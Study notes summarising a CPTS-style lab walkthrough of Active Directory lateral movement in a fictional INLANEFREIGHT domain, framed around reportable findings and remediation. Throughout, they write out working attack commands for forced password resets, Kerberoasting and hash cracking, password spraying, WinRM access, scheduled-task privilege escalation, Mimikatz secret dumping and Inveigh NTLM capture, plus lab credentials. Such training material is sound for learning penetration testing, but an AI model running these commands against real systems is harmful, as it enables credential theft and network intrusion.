## 1. Initial Foothold

After compromising **DEV01**, the assessment begins with credential discovery.

The source states that LSA secrets revealed:

```
hporter:Gr8hambino!
```

This credential becomes important because it gives us a domain user that can be used for further Active Directory enumeration and lateral movement. Pasted markdown(20261005-152310)

### Why DEV01 matters

The compromised host can act as a **staging point**.

Instead of attacking every internal system directly from the attacker machine, we can:

```
Attacker
   │
   ▼
Compromised Host
   │
   ├── AD Enumeration
   ├── Credential Hunting
   ├── RDP
   ├── WinRM
   └── Internal Network Access
```

The source initially uses the reverse shell obtained from `dmz01`, but later moves toward RDP/WinRM where useful. Pasted markdown(20261005-152310)

---

# 2. Active Directory Enumeration

## SharpHound

**SharpHound** is used to collect Active Directory information.

The collected information can include:

- Users
- Groups
- Group memberships
- Local administrator relationships
- Sessions
- Logged-on users
- Trusts
- ACLs
- RDP relationships
- DCOM relationships
- SPNs
- PSRemote relationships

The source uses:

```
c:\DotNetNuke\Portals\0> SharpHound.exe -c All
```

The `-c All` option tells SharpHound to use all available collection methods in this scenario. Pasted markdown(20261005-152310)

### Collection methods observed

```
Group
LocalAdmin
GPOLocalGroup
Session
LoggedOn
Trusts
ACL
Container
RDP
ObjectProps
DCOM
SPNTargets
PSRemote
```

The enumeration completed with:

```
3641 objects
```

and took approximately:

```
00:00:46.1149865
```

The source also records an LDAP/forest warning, but SharpHound still completed enumeration successfully. Pasted markdown(20261005-152310)

---

# 3. BloodHound

After SharpHound collects the data, the data is imported into **BloodHound**.

The purpose is to visually identify relationships and possible attack paths.

### Important discovery

Searching for:

```
hporter
```

and selecting:

```
First Degree Object Control
```

reveals:

```
HPORTER
   │
   │ ForceChangePassword
   ▼
SSMALLS
```

So `hporter` has **ForceChangePassword** rights over `ssmalls`. Pasted markdown(20261005-152310)

### Why this is important

This means the existing privileges of `hporter` can potentially be used to change the password of `ssmalls`.

That gives us a new credential and potentially another path through the environment.

---

# 4. Excessive RDP Privileges

BloodHound also reveals another important relationship:

```
Domain Users
      │
      │ CanRDP
      ▼
DEV01
```

The source points out that **all Domain Users have RDP access to DEV01**. Pasted markdown(20261005-152310)

### Security impact

If a large group has RDP access to a machine and one of those users can escalate privileges, an attacker could potentially:

- Access the machine
- Obtain credentials
- Access sensitive files
- Perform local privilege escalation
- Move further through the network

### Finding

```
Excessive Active Directory Group Privileges
```

The source rates this as:

**Medium risk**

If the entire group also had local administrator privileges, it would become a much more serious finding. Pasted markdown(20261005-152310)

---

# 5. Checking RDP

Before using RDP, the source checks whether TCP/3389 is accessible:

```
proxychains nmap -sT -p 3389 172.16.8.20
```

Result:

```
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
```

Therefore:

```
3389/tcp → RDP
```

is open. Pasted markdown(20261005-152310)

---

# 6. RDP Pivoting

The internal RDP service isn't necessarily directly accessible from the attack machine.

The source therefore uses **SSH local port forwarding**.

Conceptually:

```
Attacker
   │
   │ localhost:13389
   ▼
dmz01
   │
   │ forwarded connection
   ▼
172.16.8.20:3389
```

Command:

```
ssh -i dmz01_key -L 13389:172.16.8.20:3389 root@10.129.203.111
```

### Meaning of `-L`

```
-L LOCAL_PORT:TARGET_IP:TARGET_PORT
```

So:

```
13389 → 172.16.8.20:3389
```

The attacker connects to:

```
127.0.0.1:13389
```

and SSH forwards the traffic through the pivot.

---

# 7. Connecting with xfreerdp

The source then uses:

```
xfreerdp /v:127.0.0.1:13389 /u:hporter /p:Gr8hambino! /drive:home,"/home/tester/tools"
```

Important part:

```
/drive:home,"/home/tester/tools"
```

This redirects a local directory into the RDP session.

The source then accesses the redirected drive:

```
net use
```

and copies PowerView:

```
copy \\TSCLIENT\home\PowerView.ps1 .
```

### Important concept

RDP drive redirection can make **tool transfer** between the attack machine and Windows target much easier.

---

# 8. ForceChangePassword

Now we have:

```
hporter
   │
   │ ForceChangePassword
   ▼
ssmalls
```

PowerView is used to change the password.

First:

```
Import-Module .\PowerView.ps1
```

Then:

```
Set-DomainUserPassword -Identity ssmalls -AccountPassword (ConvertTo-SecureString 'Str0ngpass86!' -AsPlainText -Force ) -Verbose
```

The source receives:

```
Password for user 'ssmalls' successfully reset
```

### Important CPTS point

**ForceChangePassword is an AD permission/relationship that can allow one principal to reset another user's password.**

The important attack chain is:

```
Compromised User
      ↓
AD Relationship
      ↓
ForceChangePassword
      ↓
Password Reset
      ↓
New User Credential
      ↓
Further Enumeration
```

---

# 9. Validate the New Credential

The source validates the credentials against SMB:

```
proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86!
```

Result:

```
SMB 172.16.8.3 445 DC01
[+] INLANEFREIGHT.LOCAL\ssmalls:Str0ngpass86!
```

So the credential is valid. Pasted markdown(20261005-152310)

### ⚠️ Important Reporting Point

Changing a user's password is a potentially disruptive action.

For a real penetration test:

- Confirm it is authorized.
- Record it.
- Mention it in the activity log.
- Include it in the report where relevant.

---

# 10. Share Hunting

At this point BloodHound does not reveal an immediately useful path for `ssmalls`.

So the assessment moves toward **file-share hunting**.

This is extremely important in real penetration tests.

Why?

Because file shares can contain:

- Passwords
- Configuration files
- Backup scripts
- Database credentials
- API keys
- Documents
- SSH keys
- Service-account credentials
- Deployment scripts

The source specifically discusses how weak share permissions can expose departmental shares to low-privileged users. Pasted markdown(20261005-152310)

### Mental model

```
Low-privileged credential
          │
          ▼
     SMB Enumeration
          │
          ▼
      File Shares
          │
          ▼
 Search interesting files
          │
          ▼
Credentials / Secrets
          │
          ▼
 Lateral Movement
```

---

# 11. Enumerating SMB Shares

The source uses:

```
proxychains smbclient -U ssmalls '//172.16.8.3/Department Shares'
```

The share contains:

```
Accounting
Executives
Finance
HR
IT
Marketing
R&D
```

The source then explores:

```
IT
 └── Private
      └── Development
```

Inside:

```
SQL Express Backup.ps1
```

is found. Pasted markdown(20261005-152310)

---

# 12. Snaffler

**Snaffler** helps identify potentially interesting files on Windows/SMB environments.

Example from the source:

```
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

### Why use Snaffler?

Large environments can contain enormous amounts of files.

Manually checking everything is inefficient.

Snaffler helps identify files that may contain:

```
Passwords
Credentials
Configuration files
Scripts
Sensitive documents
Keys
```

---

# 13. Interesting SQL Backup Script

The file:

```
SQL Express Backup.ps1
```

contains SQL Server configuration and hardcoded credentials.

Relevant section:

```
$serverName = ".\SQLExpress"
$backupDirectory = "D:\backupSQL"

$mySrvConn = new-object Microsoft.SqlServer.Management.Common.ServerConnection
$mySrvConn.ServerInstance=$serverName
$mySrvConn.LoginSecure = $false
$mySrvConn.Login = "backupadm"
$mySrvConn.Password = "<REDACTED>"
```

The source identifies this as a hardcoded credential for:

```
backupadm
```

Pasted markdown(20261005-152310)

### Security problem

Credentials should **not** be stored in plaintext inside scripts.

Attack chain:

```
Readable SMB Share
       ↓
Backup Script
       ↓
Hardcoded Credential
       ↓
Service Account
       ↓
Potential Remote Access
```

---

# 14. SYSVOL Hunting

The source then investigates the:

```
SYSVOL
```

share.

This is particularly interesting because scripts stored in SYSVOL can sometimes contain credentials or other sensitive configuration.

An interesting script is:

```
INLANEFREIGHT.LOCAL/scripts/adum.vbs
```

The source accesses SYSVOL using:

```
proxychains smbclient -U ssmalls '//172.16.8.3/sysvol'
```

Pasted markdown(20261005-152310)

### Important lesson

Always inspect accessible:

```
SYSVOL
NETLOGON
Department Shares
User shares
IT shares
Development shares
Backup locations
```

when authorized to do so.

---

# 15. Kerberoasting

## What is Kerberoasting?

Kerberoasting targets **service accounts associated with Service Principal Names (SPNs)**.

The source uses PowerView:

```
Import-Module .\PowerView.ps1
```

Then:

```
Get-DomainUser * -SPN |Select samaccountname
```

The source discovers accounts including:

```
azureconnect
backupjob
krbtgt
mssqlsvc
sqltest
sqlqa
sqldev
mssqladm
svc_sql
sqlprod
sapsso
sapvc
vmwarescvc
```

Pasted markdown(20261005-152310)

---

# 16. Extracting Kerberos Service Tickets

The source exports SPN tickets in Hashcat format:

```
Get-DomainUser * -SPN -verbose | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_spns.csv -NoTypeInformation
```

The hashes can then be processed offline.

The source uses:

```
hashcat -m 13100 ilfreight_spns /usr/share/wordlists/rockyou.txt
```

Pasted markdown(20261005-152310)

One hash cracks, but the account does not provide a useful path.

### Finding

```
Weak Kerberos Authentication Configuration
(Kerberoasting)
```

The source explicitly treats this as a reportable finding. Pasted markdown(20261005-152310)

---

# 17. Password Spraying

Another lateral movement technique is:

# Password Spraying

Instead of trying many passwords against one user:

```
user1 → password1
user1 → password2
user1 → password3
...
```

password spraying does:

```
user1 → Welcome1
user2 → Welcome1
user3 → Welcome1
user4 → Welcome1
```

This can reduce the likelihood of locking out a single account.

The source uses:

```
Invoke-DomainPasswordSpray -Password Welcome1
```

The spray targets:

```
2913 accounts
```

and finds:

```
kdenunez : Welcome1
mmertle   : Welcome1
```

Pasted markdown(20261005-152310)

### Finding

```
Weak Active Directory Passwords
```

Even though these accounts did not provide useful access, the weak passwords are still a security finding.

---

# 18. GPP / Registry.xml

The source also checks SYSVOL for:

```
Registry.xml
```

because Group Policy configuration can historically expose credentials associated with autologon configurations.

Command:

```
proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M gpp_autologin
```

The source searches for:

```
Registry.xml
```

No useful credential is obtained in this particular case. Pasted markdown(20261005-152310)

### Important lesson

A technique producing **no result** is still useful to document during a penetration test.

It proves that the check was performed.

---

# 19. Passwords in AD Description Fields

Another credential-hunting technique is checking user descriptions:

```
Get-DomainUser * |select samaccountname,description | ?{$_.Description -ne $null}
```

The source finds:

```
frontdesk      ILFreightLobby!
```

in a description field.

### Security problem

An AD description field is **not a secure password vault**.

Passwords should never be stored in:

```
Description
Comment
Notes
User attributes
Scripts
Plaintext configuration
```

### Finding

```
Passwords in AD User Description Field
```

---

# 20. WinRM

The next target is MS01.

The source checks:

```
TCP/5985
```

Command:

```
proxychains nmap -sT -p 5985 172.16.8.50
```

Result:

```
PORT     STATE SERVICE
5985/tcp open  wsman
```

So:

```
5985 → WinRM
```

is available.

---

# 21. Evil-WinRM

The discovered `backupadm` credentials are used with:

```
proxychains evil-winrm -i 172.16.8.50 -u backupadm
```

Then:

```
hostname
```

returns:

```
ACADEMY-AEN-MS01
```

### Important concept

WinRM provides a remote PowerShell session.

Think:

```
Credentials
     ↓
WinRM : 5985
     ↓
Remote PowerShell
     ↓
Enumeration
     ↓
Credential Hunting
     ↓
Privilege Escalation
```

---

# 22. Kerberos Double Hop

The source highlights an important issue when using PowerView from the WinRM session:

> Kerberos **Double Hop**

This means that credentials authenticated to the first remote system may not automatically be delegated to authenticate to another remote system.

The source notes that a **PSCredential object** may be needed for further PowerView enumeration from the WinRM session. Pasted markdown(20261005-152310)

### CPTS concept

Remember:

```
Attacker
   ↓
WinRM
   ↓
Remote Host
   ↓
Attempt to access another remote resource
```

The second authentication can fail because of credential delegation restrictions.

---

# 23. Unattend.xml Credential Discovery

The `backupadm` account isn't local administrator.

So the source goes back to:

> **Credential hunting**

An interesting file is found:

```
C:\panther\unattend.xml
```

The source shows:

```
C:\panther
└── unattend.xml
```

Pasted markdown(20261005-152310)

---

# 24. Credentials in unattend.xml

The file contains:

```
<AutoLogon>
    <Password>
        <Value>Sys26Admin</Value>
        <PlainText>true</PlainText>
    </Password>
    <Enabled>true</Enabled>
    <LogonCount>1</LogonCount>
    <Username>ilfserveradm</Username>
</AutoLogon>
```

Therefore:

```
Username: ilfserveradm
Password: Sys26Admin
```

The source confirms that `ilfserveradm` is a local account and belongs to:

```
Remote Desktop Users
```

but not local Administrators. Pasted markdown(20261005-152310) Pasted markdown(20261005-152310)

### Security lesson

Installation artifacts can survive long after deployment.

Therefore:

```
Old installation file
       ↓
Plaintext credential
       ↓
Local account access
       ↓
Potential lateral movement
```

---

# 25. Sysax Scheduled Task Privilege Escalation

The source then investigates software installed on the system and identifies a **Sysax scheduled/triggered task** privilege escalation path.

The important concept is:

```
Low Privileged User
       ↓
Can influence task trigger
       ↓
Task executes with SYSTEM privileges
       ↓
Attacker-controlled action
       ↓
SYSTEM / Administrator
```

The source uses a batch file containing:

```
net localgroup administrators ilfserveradm /add
```

The scheduled task is configured to trigger when a file is added to a monitored directory.

### Why this matters

If a privileged service executes attacker-controlled content, the attacker can potentially cross the privilege boundary.

### Final result

The source verifies:

```
Members
Administrator
ilfserveradm
INLANEFREIGHT\Domain Admins
```

This demonstrates successful privilege escalation.

---

# 26. Post-Exploitation / Pillaging

Once higher privileges are obtained, the assessment moves into:

# Post-Exploitation

The objective is to discover:

- Credentials
- Sensitive documents
- Database information
- Password stores
- Configuration files
- Cached secrets
- Other systems to target

The source identifies files such as:

```
budget_data.xlsx
Inlanefreight.kdbx
```

as potentially interesting files in the root of `C:\`.

---

# 27. Mimikatz

The source then uses Mimikatz for credential-related post-exploitation.

Commands include:

```
privilege::debug
```

followed by:

```
token::elevate
```

The resulting context is:

```
NT AUTHORITY\SYSTEM
```

Then:

```
lsadump::secrets
```

is used.

### Important concept

LSA secrets can contain locally stored sensitive information.

---

# 28. LSA Secrets

The source obtains:

```
Secret  : DefaultPassword
cur/text: DBAilfreight1!
```

The password alone doesn't tell us which username it belongs to.

So another artifact is checked.

The Registry is queried for:

```
DefaultUserName
```

Command:

```
Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\' -Name "DefaultUserName"
```

Result:

```
DefaultUserName : mssqladm
```

Now the two pieces can be correlated:

```
mssqladm
   +
DBAilfreight1!
```

### Important technique

This is called **credential correlation**.

One artifact gives:

```
Password
```

Another artifact gives:

```
Username
```

Together:

```
Valid Credential Pair
```

---

# 29. Browser Credential Hunting

The source checks Firefox using LaZagne:

```
lazagne.exe browsers -firefox
```

Result:

```
[+] 0 passwords have been found.
```

### Lesson

Not every credential-hunting technique will succeed.

You should still document:

```
Technique attempted
↓
Result
↓
Whether useful credentials were discovered
```

This creates a complete assessment trail.

---

# 30. Inveigh

The source then explores **Inveigh**.

Inveigh can be used to test Windows network authentication/name-resolution behavior and capture authentication material in an authorized assessment.

The source loads:

```
Import-Module .\Inveigh.ps1
```

and runs:

```
Invoke-Inveigh -ConsoleOutput Y -FileOutput Y
```

The configuration includes:

```
Elevated Privilege Mode = Enabled
Primary IP Address = 172.16.8.50
DNS Spoofer = Enabled
LLMNR Spoofer = Enabled
SMB Capture = Enabled
HTTP Capture = Enabled
HTTP/HTTPS Authentication = NTLM
WPAD Authentication = NTLM
WPAD Response = Enabled
```

---

# 31. NTLMv2 Capture

The source eventually captures:

```
SMB(445) NTLMv2 captured for
ACADEMY-AEN-DEV\mpalledorous
```

The important idea is not simply the hash itself.

The important security concept is:

```
Legacy name resolution
        ↓
Authentication request
        ↓
NTLM challenge/response
        ↓
Potential credential exposure
```

### Defensive lesson

Organizations should reduce unnecessary use of legacy name-resolution mechanisms and unnecessary NTLM authentication.

---

# 32. Major Findings to Remember

These are especially important for your **CPTS report writing**.

|Finding|What caused it?|Impact|
|---|---|---|
|**Excessive Active Directory Group Privileges**|Domain Users had RDP access to DEV01|Increased lateral-movement exposure|
|**Sensitive Data on File Shares**|Credentials stored in scripts/files|Credential compromise|
|**Weak Kerberos Authentication Configuration**|Kerberoastable SPNs|Offline password cracking|
|**Weak Active Directory Passwords**|`Welcome1` used by multiple users|Account compromise|
|**Passwords in AD User Description Field**|Password stored in description|Credential disclosure|
|**Credentials in unattend.xml**|Plaintext autologon password|Local account compromise|
|**Local Privilege Escalation**|Vulnerable/unsafe scheduled task execution|Administrator/SYSTEM compromise|

---

# 33. The Complete Attack Chain 🧠

This is the **most important part to memorize**.

```
DEV01 COMPROMISE
       │
       ▼
LSA SECRET
       │
       ▼
hporter:Gr8hambino!
       │
       ▼
SharpHound
       │
       ▼
BloodHound
       │
       ▼
ForceChangePassword
       │
       ▼
ssmalls
       │
       ▼
Password Reset
       │
       ▼
SMB Enumeration
       │
       ▼
File Share Hunting
       │
       ▼
SQL Express Backup.ps1
       │
       ▼
backupadm
       │
       ▼
WinRM
       │
       ▼
MS01
       │
       ▼
unattend.xml
       │
       ▼
ilfserveradm
       │
       ▼
Privilege Escalation
       │
       ▼
Administrator / SYSTEM
       │
       ▼
LSA Secrets
       │
       ▼
Credential Correlation
       │
       ▼
Further Post-Exploitation
```

---

# 34. CPTS Important Concepts

### 🔥 Memorize these

**SharpHound**

> Collects AD relationship information.

**BloodHound**

> Visualizes AD relationships and helps identify attack paths.

**ForceChangePassword**

> AD relationship that can allow a principal to reset another user's password.

**RDP**

```
3389/tcp
```

**WinRM**

```
5985/tcp
```

**SMB**

```
445/tcp
```

**Kerberoasting**

> Targeting SPN-associated service accounts and obtaining service-ticket material for offline password cracking.

**Password Spraying**

> Trying one/few passwords against many accounts.

**Snaffler**

> Helps hunt interesting files and credentials across Windows/SMB environments.

**SYSVOL**

> Important AD share that can contain scripts and configuration information.

**unattend.xml**

> Windows installation configuration file that may contain sensitive autologon credentials.

**LSA Secrets**

> Windows-stored secrets that may contain credential-related information.

**Inveigh**

> Tool used in the source to test/capture Windows authentication traffic involving legacy name-resolution/authentication behavior.

**Kerberos Double Hop**

> A credential-delegation/authentication issue encountered when attempting to authenticate from one remote system to another.

---

# 35. CPTS Reporting Mindset

Don't write your report like:

> "I ran SharpHound and found something."

Instead write it like:

### Finding

**Excessive Active Directory Group Privileges**

### Description

The assessment identified that the `Domain Users` group had RDP access to `DEV01`.

### Evidence

BloodHound showed:

```
DOMAIN USERS
      │
      │ CanRDP
      ▼
DEV01
```

### Impact

Any compromised domain account belonging to the group could potentially establish an RDP session. If combined with local privilege escalation or credential exposure, this could facilitate further compromise.

### Recommendation

Restrict RDP access to the users and groups that actually require it and follow least-privilege principles.

---

# 🧠 Final Revision Formula

When you're stuck during an AD assessment, remember:

```
ENUMERATE
    ↓
RELATIONSHIPS
    ↓
CREDENTIALS
    ↓
SHARES
    ↓
REMOTE ACCESS
    ↓
PRIVILEGE ESCALATION
    ↓
PILLAGE
    ↓
CORRELATE
    ↓
LATERAL MOVEMENT
    ↓
REPORT
```

That is the **core logic behind this entire Lateral Movement section**. The source repeatedly demonstrates that when one attack path fails, you don't stop—you go back to **enumeration and credential discovery** and look for another path. Pasted markdown(20261005-152310)